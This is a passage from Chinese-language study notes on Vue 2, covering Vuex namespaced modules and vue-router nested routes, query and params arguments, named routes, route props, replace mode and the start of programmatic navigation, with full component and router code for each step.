            <li v-for="p in personList" :key="p.id">{{p.name}}</li>
        </ul>
  </div>
</template>

<script>
import {nanoid} from 'nanoid'
export default {
    name: 'Person',
    data(){
        return {
            name:''
        }
    },
    computed:{
        personList(){
            return this.$store.state.personAbout.personList;
        },
        sum(){
            return this.$store.state.countAbout.sum;
        },
        firstPersonName(){
            return this.$store.getters['personAbout/firstPersonName']
        }
    },
    methods:{
        add(){
            const personObj = {id:nanoid(),name:this.name}
            console.log('user',personObj);
            this.$store.commit('personAbout/ADD_PERSON',personObj);
            this.name = ''
        },
        addWang()
        {
            const personObj = {id:nanoid(),name:this.name}
            console.log('user',personObj);
            this.$store.dispatch('personAbout/addPersonWang',personObj);
            this.name = ''
        },
        addPersonServer(){
            this.$store.dispatch('personAbout/addPersionServer')
        }
    }
}
</script>

<style>

</style>
```

启动服务

![image-20250213232247314](.\images\image-20250213232247314.png)



#### 总结 ： 模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确。

2. 修改```store.js```

   ```javascript
   const countAbout = {
     namespaced:true,//开启命名空间
     state:{x:1},
     mutations: { ... },
     actions: { ... },
     getters: {
       bigSum(state){
          return state.sum * 10
       }
     }
   }
   
   const personAbout = {
     namespaced:true,//开启命名空间
     state:{ ... },
     mutations: { ... },
     actions: { ... }
   }
   
   const store = new Vuex.Store({
     modules: {
       countAbout,
       personAbout
     }
   })
   ```

3. 开启命名空间后，组件中读取state数据：

   ```js
   //方式一：自己直接读取
   this.$store.state.personAbout.list
   //方式二：借助mapState读取：
   ...mapState('countAbout',['sum','school','subject']),
   ```

4. 开启命名空间后，组件中读取getters数据：

   ```js
   //方式一：自己直接读取
   this.$store.getters['personAbout/firstPersonName']
   //方式二：借助mapGetters读取：
   ...mapGetters('countAbout',['bigSum'])
   ```

5. 开启命名空间后，组件中调用dispatch

   ```js
   //方式一：自己直接dispatch
   this.$store.dispatch('personAbout/addPersonWang',person)
   //方式二：借助mapActions：
   ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   ```

6. 开启命名空间后，组件中调用commit

   ```js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
   ```

 

## 4. 路由

### 4.1 基本使用

```sh
npm i vue-router@3
```

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
      <div class="col-xs-offset-2 col-xs-8">
        <div class="page-header"><h2>Vue Router Demo</h2></div>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- 原始HTML使用a标签实现页面的跳转 -->
          <!-- <a class="list-group-item" href="./about.html">About</a>
          <a class="list-group-item active" href="./home.html">Home</a> -->
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: "App"
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../components/About'
import Home from '../components/Home'

//创建并暴露一个路由器
export default new VueRouter({
    routes:[
    {
        path:'/about',
        component:About
    },
    {
        path:'/home',
        component:Home
    }
   ] 
})

```

src\components\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
    name: 'About'
}
</script>
```

src\components\Home.vue

```vue
<template>
    <h2>我是Home的内容</h2>
</template>

<script>
export default {
    name: 'Home'
}
</script>
```

![image-20250214233720875](.\images\image-20250214233720875.png)



总结：

1. 安装vue-router，命令：```npm i vue-router```

2. 应用插件：```Vue.use(VueRouter)```

3. 编写router配置项:

   ```js
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入Luyou 组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
   	routes:[
   		{
   			path:'/about',
   			component:About
   		},
   		{
   			path:'/home',
   			component:Home
   		}
   	]
   })
   
   //暴露router
   export default router
   ```

4. 实现切换（active-class可配置高亮样式）

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位置

   ```vue
   <router-view></router-view>
   ```



2.几个注意点

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。



### 4.2 多级路由

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'

//创建并暴露一个路由器
export default new VueRouter({
    routes:[
    {
        path:'/about',
        component:About
    },
    {
        path:'/home',
        component:Home,
        children:[
            {
                path: 'news',
                component: News
            },
            {
                path: 'message',
                component: Message
            }
        ]
    }
   ] 
})
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header"><h2>Vue Router Demo</h2></div>
  </div>
</template>

<script>
export default {
    name: 'Banner'
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  }
};
</script>
```

src\pages\Home.vue

```vue
<template>
<div>
    <h2>我是Home的内容</h2>
    <div>
        <ul  class="nav nav-tabs">
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link> 
            </li>
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link> 
            </li>
        </ul>
        <router-view></router-view>
    </div>
</div>
</template>

<script>
export default {
    name: 'Home',
    beforeDestroy(){
        console.log('home组件即将被销毁了');
    },
    mounted(){
        console.log('Home组件挂载完毕了',this);
        window.homeRouter = this.$route;
        window.HomeRouter = this.$router;
    }
}
</script>
```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
        <li>
            <a href="/message1"> message001</a> &nbsp;&nbsp;
        </li>
        <li>
            <a href="/message2"> message002</a> &nbsp;&nbsp;
        </li>
        <li>
            <a href="/message3"> message003</a> &nbsp;&nbsp;
        </li>
    </ul>
  </div>
</template>

<script>
export default {
    name: 'Message'
}
</script>
```

src\pages\News.vue

```vue
<template>
  <ul>
    <li>news001</li>
    <li>news002</li>
    <li>news003</li>
  </ul>
</template>

<script>
export default {
  name: "News",
}
</script>
```

启动服务以验证

![image-20250215123844236](.\images\image-20250215123844236.png)

总结：多级路由（多级路由）

1. 配置路由规则，使用children配置项：

   ```js
   routes:[
   	{
   		path:'/about',
   		component:About,
   	},
   	{
   		path:'/home',
   		component:Home,
   		children:[ //通过children配置子级路由
   			{
   				path:'news', //此处一定不要写：/news
   				component:News
   			},
   			{
   				path:'message',//此处一定不要写：/message
   				component:Message
   			}
   		]
   	}
   ]
   ```

2. 跳转（要写完整路径）：

   ```vue
   <router-link to="/home/news">News</router-link>
   ```



### 4.3 路由的Query参数

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
    routes:[
    {
        path:'/about',
        component:About
    },
    {
        path:'/home',
        component:Home,
        children:[
            {
                path: 'news',
                component: News
            },
            {
                path: 'message',
                component: Message,
                children: [
                    {
                        path: 'detail',
                        component: Detail
                    }
                ]
            }
        ]
    }
   ] 
})
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header"><h2>Vue Router Demo</h2></div>
  </div>
</template>

<script>
export default {
    name: 'Banner'
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  }
};
</script>
```

src\pages\Home.vue

```vue
<template>
<div>
    <h2>我是Home的内容</h2>
    <div>
        <ul  class="nav nav-tabs">
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link> 
            </li>
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link> 
            </li>
        </ul>
        <router-view></router-view>
    </div>
</div>
</template>

<script>
export default {
    name: 'Home',
    beforeDestroy(){
        console.log('home组件即将被销毁了');
    },
    mounted(){
        console.log('Home组件挂载完毕了',this);
        window.homeRouter = this.$route;
        window.HomeRouter = this.$router;
    }
}
</script>
```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
        <li v-for="m in messageList" :key="m.id">
            <!-- 跳转路由并携带query参数，to的字符串写法 -->
            <!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{m.title}}</router-link> -->
            <!-- 跳转并携带query参数，to的对象写法 -->
            <router-link :to="{
                path: '/home/message/detail',
                query:{
                    id: m.id,
                    title: m.title
                }
            }">{{m.title}}</router-link>
            
        </li>
        
    </ul>
    <hr/>
    <router-view></router-view>
  </div>
</template>

<script>
export default {
    name: 'Message',
    data(){
        return {
            messageList:[
                {id: '001',title:'消息001'},
                {id: '002',title:'消息002'},
                {id: '003',title:'消息003'},
            ]
        }
    }
}
</script>
```

src\pages\Detail.vue

```vue
<template>
  <ul>
    <li>消息编号： {{$route.query.id}}</li>
    <li>消息标题： {{$route.query.title}}</li>
  </ul>
</template>

<script>
export default {
    name: 'Detail',
    mounted(){
        console.log(this.$route);
    }
}
</script>
```

src\pages\News.vue

```vue
<template>
  <ul>
    <li>news001</li>
    <li>news002</li>
    <li>news003</li>
  </ul>
</template>

<script>
export default {
  name: "News",
}
</script>

```

运行服务

![image-20250215142743633](.\images\image-20250215142743633.png)

总结：路由的query参数

1. 传递参数

   ```vue
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
   				
   <!-- 跳转并携带query参数，to的对象写法 -->
   <router-link 
   	:to="{
   		path:'/home/message/detail',
   		query:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

2. 接收参数：

   ```js
   $route.query.id
   $route.query.title
   ```

### 4.4 命名路由

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" :to="{
            name: 'guanyu'
          }">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
    routes:[
    {
        name: 'guanyu',
        path:'/about',
        component:About
    },
    {
        path:'/home',
        component:Home,
        children:[
            {
                path: 'news',
                component: News
            },
            {
                path: 'message',
                component: Message,
                children: [
                    {
                        name: 'xiangqing',
                        path: 'detail',
                        component: Detail
                    }
                ]
            }
        ]
    }
   ] 
})
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header"><h2>Vue Router Demo</h2></div>
  </div>
</template>

<script>
export default {
    name: 'Banner'
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  }
};
</script>
```

src\pages\Home.vue

```vue
<template>
<div>
    <h2>我是Home的内容</h2>
    <div>
        <ul  class="nav nav-tabs">
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link> 
            </li>
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link> 
            </li>
        </ul>
        <router-view></router-view>
    </div>
</div>
</template>

<script>
export default {
    name: 'Home',
    beforeDestroy(){
        console.log('home组件即将被销毁了');
    },
    mounted(){
        console.log('Home组件挂载完毕了',this);
        window.homeRouter = this.$route;
        window.HomeRouter = this.$router;
    }
}
</script>
```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
        <li v-for="m in messageList" :key="m.id">
            <!-- 跳转路由并携带query参数，to的字符串写法 -->
            <!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{m.title}}</router-link> -->
            <!-- 跳转并携带query参数，to的对象写法 -->
            <router-link :to="{
                //path: '/home/message/detail',
                name: 'xiangqing',
                query:{
                    id: m.id,
                    title: m.title
                }
            }">{{m.title}}</router-link>
            
        </li>
        
    </ul>
    <hr/>
    <router-view></router-view>
  </div>
</template>

<script>
export default {
    name: 'Message',
    data(){
        return {
            messageList:[
                {id: '001',title:'消息001'},
                {id: '002',title:'消息002'},
                {id: '003',title:'消息003'},
            ]
        }
    }
}
</script>
```

src\pages\Detail.vue

```vue
<template>
  <ul>
    <li>消息编号： {{$route.query.id}}</li>
    <li>消息标题： {{$route.query.title}}</li>
  </ul>
</template>

<script>
export default {
    name: 'Detail',
    mounted(){
        console.log(this.$route);
    }
}
</script>
```

src\pages\News.vue

```vue
<template>
  <ul>
    <li>news001</li>
    <li>news002</li>
    <li>news003</li>
  </ul>
</template>

<script>
export default {
  name: "News",
}
</script>
```

![image-20250215144544521](.\images\image-20250215144544521.png)

总结：命名路由

1. 作用：可以简化路由的跳转。

2. 如何使用

   1. 给路由命名：

      ```js
      {
      	path:'/demo',
      	component:Demo,
      	children:[
      		{
      			path:'test',
      			component:Test,
      			children:[
      				{
                            name:'hello' //给路由命名
      					path:'welcome',
      					component:Hello,
      				}
      			]
      		}
      	]
      }
      ```

   2. 简化跳转：

      ```vue
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>
      
      <!--简化后，直接通过名字跳转 -->
      <router-link :to="{name:'hello'}">跳转</router-link>
      
      <!--简化写法配合传递参数 -->
      <router-link 
      	:to="{
      		name:'hello',
      		query:{
      		   id:666,
                  title:'你好'
      		}
      	}"
      >跳转</router-link>
      ```



### 4.5 路由的params参数

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" :to="{
            name: 'guanyu'
          }">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
    routes:[
    {
        name: 'guanyu',
        path:'/about',
        component:About
    },
    {
        path:'/home',
        component:Home,
        children:[
            {
                path: 'news',
                component: News
            },
            {
                path: 'message',
                component: Message,
                children: [
                    {
                        name: 'xiangqing',
                        path: 'detail/:id/:title',
                        component: Detail
                    }
                ]
            }
        ]
    }
   ] 
})
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header"><h2>Vue Router Demo</h2></div>
  </div>
</template>

<script>
export default {
    name: 'Banner'
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  }
};
</script>
```

src\pages\Home.vue

```vue
<template>
<div>
    <h2>我是Home的内容</h2>
    <div>
        <ul  class="nav nav-tabs">
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link> 
            </li>
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link> 
            </li>
        </ul>
        <router-view></router-view>
    </div>
</div>
</template>

<script>
export default {
    name: 'Home',
    beforeDestroy(){
        console.log('home组件即将被销毁了');
    },
    mounted(){
        console.log('Home组件挂载完毕了',this);
        window.homeRouter = this.$route;
        window.HomeRouter = this.$router;
    }
}
</script>
```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
        <li v-for="m in messageList" :key="m.id">
            <!-- 跳转路由并携带param参数，to的字符串写法 -->
            <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}-1</router-link> &nbsp; &nbsp;
            <!-- 跳转并携带query参数，to的对象写法 -->
            <router-link :to="{
                //path: '/home/message/detail',
                name: 'xiangqing',
                params:{
                    id: m.id,
                    title: m.title
                }
            }">{{m.title}}</router-link>
            
        </li>
        
    </ul>
    <hr/>
    <router-view></router-view>
  </div>
</template>

<script>
export default {
    name: 'Message',
    data(){
        return {
            messageList:[
                {id: '001',title:'消息001'},
                {id: '002',title:'消息002'},
                {id: '003',title:'消息003'},
            ]
        }
    }
}
</script>
```

src\pages\Detail.vue

```vue
<template>
  <ul>
    <li>消息编号： {{$route.params.id}}</li>
    <li>消息标题： {{$route.params.title}}</li>
  </ul>
</template>

<script>
export default {
    name: 'Detail',
    mounted(){
        console.log(this.$route);
    }
}
</script>
```

src\pages\News.vue

```vue
<template>
  <ul>
    <li>news001</li>
    <li>news002</li>
    <li>news003</li>
  </ul>
</template>

<script>
export default {
  name: "News",
}
</script>
```

运行输出

![image-20250215155951408](.\images\image-20250215155951408.png)



总结：路由的params参数

1. 配置路由，声明接收params参数

   ```js
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', //使用占位符声明接收params参数
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ```

2. 传递参数

   ```vue
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

   > 特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！

3. 接收参数：

   ```js
   $route.params.id
   $route.params.title
   ```





### 4.6 路由的props配制

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" :to="{
            name: 'guanyu'
          }">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'news',
                    component: News
                },
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail',
                            component: Detail,
                            // props的第一种写法，值为对象，该对象中所有key-value都会以props的形式传递给Detail组件
                            // props: {a:1,b:'hello'}
                            //props的第二种写法，值为布尔值，就会把该路由组件收到的所有params参数，以porps的形式传递给Details组件
                            // props: true
                            //第三种写法，值为函数
                            props($route) {
                                return {
                                    id: $route.query.id,
                                    title: $route.query.title,
                                    a: 1,
                                    b: 'hello'
                                }
                            }
                        }
                    ]
                }
            ]
        }
    ]
})
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header"><h2>Vue Router Demo</h2></div>
  </div>
</template>

<script>
export default {
    name: 'Banner'
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  }
};
</script>
```

src\pages\Home.vue

```vue
<template>
<div>
    <h2>我是Home的内容</h2>
    <div>
        <ul  class="nav nav-tabs">
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link> 
            </li>
            <li>
                <router-link class="list-group-item" active-class="active" to="/home/message">Message</router-link> 
            </li>
        </ul>
        <router-view></router-view>
    </div>
</div>
</template>

<script>
export default {
    name: 'Home',
    beforeDestroy(){
        console.log('home组件即将被销毁了');
    },
    mounted(){
        console.log('Home组件挂载完毕了',this);
        window.homeRouter = this.$route;
        window.HomeRouter = this.$router;
    }
}
</script>
```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带param参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}-1</router-link> &nbsp; &nbsp; -->
        <!-- 跳转并携带query参数，to的对象写法 -->
        <router-link
          :to="{
            //path: '/home/message/detail',
            name: 'xiangqing',
            query: {
              id: m.id,
              title: m.title,
            },
          }"
          >{{ m.title }}</router-link
        >
      </li>
    </ul>
    <hr />
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
};
</script>

```

src\pages\Detail.vue

```vue
<template>
  <ul>
    <!-- <li>消息编号： {{$route.params.id}}</li> -->
    <!-- <li>消息标题： {{$route.params.title}}</li> -->
    <li>消息编号： {{ id }}</li>
    <li>消息标题： {{ title }}</li>
    <li>其他参数： {{ a }},{{ b }}</li>
  </ul>
</template>

<script>
export default {
  name: "Detail",
  props: ["id", "title", "a", "b"],
  computed: {
    // id(){
    // 	return this.$route.query.id
    // },
    // title(){
    // 	return this.$route.query.title
    // },
  },
  mounted() {
     console.log('detail组件完毕',this.$route)
  },
};
</script>

```

src\pages\News.vue

```vue
<template>
  <ul>
    <li>news001</li>
    <li>news002</li>
    <li>news003</li>
  </ul>
</template>

<script>
export default {
  name: "News",
}
</script>
```



![image-20250215162154824](.\images\image-20250215162154824.png)

总结：路由的props配置

​	作用：让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

### 4.7 路由的replace模式

与4.6相比，其他文件都一样，修改以下文件

src\pages\Home.vue

```vue
<template>
<div>
    <h2>我是Home的内容</h2>
    <div>
        <ul  class="nav nav-tabs">
            <li>
                <router-link replace class="list-group-item" active-class="active" to="/home/news">News</router-link> 
            </li>
            <li>
                <router-link  replace class="list-group-item" active-class="active" to="/home/message">Message</router-link> 
            </li>
        </ul>
        <router-view></router-view>
    </div>
</div>
</template>

<script>
export default {
    name: 'Home',
    beforeDestroy(){
        console.log('home组件即将被销毁了');
    },
    mounted(){
        console.log('Home组件挂载完毕了',this);
        window.homeRouter = this.$route;
        window.HomeRouter = this.$router;
    }
}
</script>

```

添加replace属性

总结： ```<router-link>```的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```
3. 如何开启```replace```模式：```<router-link replace .......>News</router-link>```



### 4.8 编程式路由导航

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" :to="{
            name: 'guanyu'
          }">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
